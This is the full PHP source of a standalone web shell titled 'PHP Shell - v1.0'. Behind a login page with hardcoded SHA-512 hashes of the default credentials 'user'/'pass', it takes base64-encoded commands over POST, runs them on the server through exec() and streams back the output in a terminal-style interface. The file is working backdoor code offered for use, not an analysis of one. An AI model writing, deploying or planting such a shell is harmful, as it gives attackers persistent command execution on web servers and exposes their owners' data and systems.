<?php

//
// Author: Dr34dedPr0c355 / ebenner / eb3095
//

//
// Config
// Username and password are in sha512
// Default
//   username: user
//   password: pass
//

$USERNAME = "b14361404c078ffd549c03db443c3fede2f3e534d73f78f77301ed97d4a436a9fd9db05ee8b325c0ad36438b43fec8510c204fc1c1edb21d0941c00e9e2c1ce2";
$PASSWORD = "5b722b307fce6c944905d132691d5e4a2214b7fe92b738920eb3fce3a90420a19511c3010a0e7712b054daef5b57bad59ecbd93b3280f210578f547f4aed4d25";

// Session
session_start();

// Variables
$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";

// Sanitize Dirs
function getDir($dir, $cmd = false) {
    if ($cmd) {
        chdir($dir);
        $dir = getcwd();
    }
    if ($dir == "/") {
        return $dir;
    }
    if (substr_count($dir, "\\") == 0 && substr_count($dir, "/") != 0) {
        $split = explode("/", $dir);
    } else if (substr_count($dir, "\\") != 0 && substr_count($dir, "/") == 0) {
        $split = explode("\\", $dir);
    } else {
        return $dir;
    }
    return $split[count($split)-1];
}

// Login Screen
function displayLogin($failed = false) {
    ?>
        <div class="login">
            <?php if ($failed) { ?>
                <span class="error">Failed Login!</span><br>
            <?php } ?>
            <form method="post">
                <table>
                    <tr>
                        <td><span class="input-label">Username</span></td><td><input type="text" id="username" name="username" class="input user"></td>
                    </tr>
                    <tr>
                        <td><span class="input-label">Password</span></td><td><input type="password" id="password" name="password" class="input password"></td>
                    </tr>
                    <tr>
                        <td><input class="login-button" type="submit" value="Log in"></td><td></td>
                    </tr>
                </table>

            </form>
        </div>
    <?php
}

// Shell Screen
function displayShell() {
    ?>
    <div id ="shell-container" class="shell-container">
        <table>
            <tr>
                <td>
                    <div id="shell" class="shell">
                    </div>
                </td>
            </tr>
            <tr class="shell-command-row">
                <td>
                    <span id="bash" class="bash"><?php echo $_SESSION['user']."@".$_SESSION['hostname'].":<span id='cwd'>".$_SESSION['cwd']."</span>"; ?># </span><input type="text" id="exec" name="exec" class="command">
                </td>
            </tr>
        </table>
    </div>
    <?php
}

// Execute Command
function executeCMD($cmd) {
    $trail = substr($cmd, -2);
    if ($trail != " &") {
        $trail = "";
    }
    chdir($_SESSION['cwdlong']);
    if (substr($cmd, 0, 3) == "cd " && strpos($cmd, ";") == 0) {
        $split = explode(" ", $cmd);
        if ($split[0] == "cd") {
            $dir = getDir(substr($cmd, 3), true);
            $_SESSION['cwd'] = $dir;
            $_SESSION['cwdlong'] = getcwd();
            echo '{"cwd": "'.$dir.'"}';
            return;
        }
    }
    exec($cmd . " 2>&1" . $trail, $output);
    $json = '{"lines": [';
    for ($ctr = 0; $ctr < count($output); $ctr++) {
        $json .= '"'.base64_encode($output[$ctr]).'"';
        if ($ctr < count($output)-1) {
            $json .= ",";
        }
    }
    $json .= ']}';
    echo $json;
}

// Program
if (!isset($_POST['exec'])) {
    echo "<html>
            <head>
                <title>PHP Shell - v1.0</title>
            </head>
            <body>
            <style>
                body {
                    background: #00b7ea;
                    background: -moz-linear-gradient(top, #00b7ea 0%, #009ec3 100%);
                    background: -webkit-linear-gradient(top, #00b7ea 0%,#009ec3 100%);
                    background: linear-gradient(to bottom, #00b7ea 0%,#009ec3 100%);
                    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#00b7ea', endColorstr='#009ec3',GradientType=0 );
                }
                .shell {
                    height: 100%;
                    overflow-y: scroll;
                    overflow-wrap: break-word;
                    word-break: break-all;
                }
                .shell-container {                
                    background: black;
                    width: 100%;
                    height: 100%;
                    -webkit-box-shadow: 0px 0px 0px 20px rgba(0,0,0,1);
                    box-shadow: 0px 0px 0px 20px rgba(0,0,0,1);
                }
                .shell-container, .shell-command-row .bash, .shell-command-row input, .shell {            
                    font-family: monospace;
                    color: white;
                }
                .shell-container table td {
                    padding: 10px;
                }
                .command {
                    background: none;   
                    border: none;
                    width: calc(100% - 200px);
                    outline: none !important;
                }
                .shell-container table {
                    width: 100%;
                    height: 100%;
                }
                .shell-command-row {
                    height: 40px;
                }
                .error {
                    display: block;
                    width: 100%;
                    text-align: center;
                    height: 0px;
                    color: red;
                    font-weight: bolder;
                    text-shadow: 1px 1px 1px black;
                }
                .input-label {
                    color: white;
                    font-weight: bolder;
                    text-shadow: 1px 1px 1px black;
                }
                .login-button {
                    padding: 5px;
                    background: #8fc400;
                    background: -moz-linear-gradient(top, #8fc400 0%, #8fc400 100%);
                    background: -webkit-linear-gradient(top, #8fc400 0%,#8fc400 100%);
                    background: linear-gradient(to bottom, #8fc400 0%,#8fc400 100%);
                    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#8fc400', endColorstr='#8fc400',GradientType=0 );
                    border: none;
                    outline: none;
                    -webkit-box-shadow: 5px 5px 15px 5px rgba(0,0,0,0.62);
                    box-shadow: 5px 5px 15px 5px rgba(0,0,0,0.62);
                    color: white;
                    text-shadow: 1px 1px 1px black;
                    font-weight: bolder;
                    transition: background 1s ease;
                }
                .login-button:hover {
                    padding: 5px;
                    background: #299a0b;
                    background: -moz-linear-gradient(top, #299a0b 0%, #299a0b 100%);
                    background: -webkit-linear-gradient(top, #299a0b 0%,#299a0b 100%);
                    background: linear-gradient(to bottom, #299a0b 0%,#299a0b 100%);
                    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#299a0b', endColorstr='#299a0b',GradientType=0 );
                    border: none;
                    outline: none;
                    -webkit-box-shadow: 5px 5px 15px 5px rgba(0,0,0,0.62);
                    box-shadow: 5px 5px 15px 5px rgba(0,0,0,0.62);
                    color: white;
                    text-shadow: 1px 1px 1px black;
                    font-weight: bolder;
                    transition: background 1s ease;
                    cursor: pointer;
                }
                .login {
                    width: 300px;
                    height: 100px;
                    position: absolute;
                    left: 50%;
                    top: 50%;
                    margin-top: -50px;
                    margin-left: -150px;
                    padding: 20px;
                    background: #6db3f2;
                    background: -moz-linear-gradient(top, #6db3f2 0%, #54a3ee 50%, #3690f0 51%, #1e69de 100%);
                    background: -webkit-linear-gradient(top, #6db3f2 0%,#54a3ee 50%,#3690f0 51%,#1e69de 100%);
                    background: linear-gradient(to bottom, #6db3f2 0%,#54a3ee 50%,#3690f0 51%,#1e69de 100%);
                    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#6db3f2', endColorstr='#1e69de',GradientType=0 );
                    border-radius: 10px;
                    -webkit-box-shadow: 5px 5px 15px 5px rgba(0,0,0,0.62);
                    box-shadow: 5px 5px 15px 5px rgba(0,0,0,0.62);
                }
                
                .login table {
                    margin-left: auto;
                    margin-right: auto;
                }
            </style>";
}

if (!isset($_SESSION['logged_in']) && isset($_POST['exec'])) {
    echo '{"error": "NoLogin"}';
} else if (!isset($_SESSION['logged_in'])) {
    if (!isset($_POST['username'])) {
        displayLogin();
    } else {
        if (hash('sha512', $_POST['username']) == $USERNAME && hash('sha512', $_POST['password']) == $PASSWORD) {
            $_SESSION['logged_in'] = true;
            $_SESSION['cwd'] = getDir(getcwd());
            $_SESSION['cwdlong'] = getcwd();
            $_SESSION['hostname'] = gethostname();
            $_SESSION['user'] = posix_getpwuid(posix_geteuid())['name'];
            displayShell();
        } else {
            displayLogin(true);
        }
    }
} else if ($_SESSION['logged_in'] && isset($_POST['logout'])) {
    unset($_SESSION['logged_in']);
    displayLogin();
} else if ($_SESSION['logged_in'] && !isset($_POST['exec'])) {
    $_SESSION['cwd'] = getDir(getcwd());
    $_SESSION['cwdlong'] = getcwd();
    $_SESSION['hostname'] = gethostname();
    $_SESSION['user'] = posix_getpwuid(posix_geteuid())['name'];
    displayShell();
} else if ($_SESSION['logged_in'] && isset($_POST['exec'])) {
    executeCMD(base64_decode($_POST['exec']));
}

if (isset($_SESSION['logged_in']) && !isset($_POST['exec'])) {
    echo "  <script>
                var cmdhistory = [];
                var position = -1;
            
                function bindExec() {
                    document.getElementById('exec').onkeydown = execKey;
                }
                
                function execKey(event) {
                    if (event.code === 'Enter') {
                        let exec = document.getElementById('exec');
                        let cmd = exec.value;
                        if (cmd === 'exit') {
                            let form = document.createElement('form');
                            document.body.appendChild(form);
                            form.method = 'POST';
                            let elem = document.createElement('input');
                            elem.name = 'logout';
                            elem.id = 'logout';
                            elem.type = 'hidden';
                            elem.value = 'true';
                            form.appendChild(elem);
                            form.submit();
                            return;
                        }
                        if (cmd === 'cls') {
                            cmdhistory.push(exec.value);
                            position = -1;
                            let shell = document.getElementById('shell');
                            shell.innerText = '';
                            shell.innerText += document.getElementById('bash').innerText + '' + exec.value + '\\n';
                            exec.value = '';
                            return;
                        }
                        cmdhistory.push(exec.value);
                        exec.value = '';
                        position = -1;
                        let shell = document.getElementById('shell');
                        shell.innerText += document.getElementById('bash').innerText + '' + cmd + '\\n';
                        let req = new XMLHttpRequest();
                        req.open('POST', '".$protocol.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."');
                        req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                        req.addEventListener('load', function() {
                            if (req.readyState === req.DONE) {
                                if (req.status === 200) {
                                    let response = JSON.parse(req.responseText);
                                    if (response.error && response.error === 'NoLogin') {
                                        window.location = '".$protocol.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."';
                                        return;
                                    } else if (response.error) {                                        
                                        shell.innerText += response.error + '<br>';
                                    }
                                    if (response.cwd) {
                                        document.getElementById('cwd').innerText = response.cwd;
                                    }
                                    if (response.lines) {
                                        response.lines.forEach(line => {
                                            shell.innerText += atob(line) + '\\n';
                                        });
                                        shell.scrollTop = shell.scrollHeight;
                                    }
                                }
                            }
                        });
                        cmd = btoa(cmd);
                        req.send('exec='+cmd);
                    }
                    if (event.code === 'ArrowUp') {
                        if (cmdhistory.length === 0) {
                            return;
                        }
                        if (position === -1) {
                            position = cmdhistory.length; 
                        }
                        position--;
                        if (position < 0) {
                            position = 0;
                        }
                        document.getElementById('exec').value = cmdhistory[position];
                    }
                    if (event.code === 'ArrowDown') {
                        if (cmdhistory.length === 0) {
                            return;
                        }                    
                        if (position === -1) {
                            position = cmdhistory.length - 1; 
                        }
                        position++;
                        if (position >= cmdhistory.length) {
                            position = cmdhistory.length;
                            document.getElementById('exec').value = '';
                            return;
                        }
                        document.getElementById('exec').value = cmdhistory[position];
                    }
                }
                
                function bindClick() {
                    document.getElementById('shell-container').onclick = event => {
                        document.getElementById('exec').focus();
                    };
                }
                
                window.onload = (event) => {
                    bindExec();
                    bindClick();
                };
            </script>";
}

if (!isset($_POST['exec'])) {
    echo "  </body>
          </html>";
}

